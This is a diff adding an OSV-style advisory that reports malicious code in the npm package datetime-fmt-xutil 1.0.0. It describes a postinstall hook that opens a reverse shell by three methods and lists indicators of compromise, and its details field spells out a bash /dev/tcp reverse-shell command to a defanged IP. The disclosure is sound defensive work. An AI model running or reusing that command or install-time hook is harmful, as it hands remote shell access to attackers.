@@ -1,0 +1,66 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-11175",
+  "modified": "2026-08-13T13:43:31Z",
+  "published": "2026-08-13T13:43:05Z",
+  "summary": "Malicious code in datetime-fmt-xutil (npm)",
+  "details": "The postinstall hook (postinstall.js) opens a reverse shell to 8[.]135[.]48[.]40:4444 at install time, trying three methods in order: a Node net socket piping /bin/sh, bash -i \u003e\u0026 /dev/tcp/8[.]135[.]48[.]40/4444, and a python3 pty spawn. On failure it HTTP GETs hxxp://8[.]135[.]48[.]40/shell/failed?err=[.][.]. to report back to the C2. The main index.js is a decoy date-formatting function.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "datetime-fmt-xutil",
+        "purl": "pkg:npm/datetime-fmt-xutil"
+      },
+      "versions": [
+        "1.0.0"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ]
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/datetime-fmt-xutil/v/1.0.0"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-11175"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-08-13T13:43:05Z",
+      "indicators_observed": {
+        "ip_observed": [
+          "8[.]135[.]48[.]40",
+          "8[.]135[.]48[.]40:4444"
+        ],
+        "sha256": [
+          "273e7bebe86cc3d97e34ff3ab6001efd0cafa5ef2fbafd22c30c57b881846ad0"
+        ],
+        "url_observed": [
+          "hxxp://8[.]135[.]48[.]40/shell/error",
+          "hxxp://8[.]135[.]48[.]40/shell/failed"
+        ]
+      }
+    }
+  }
+}
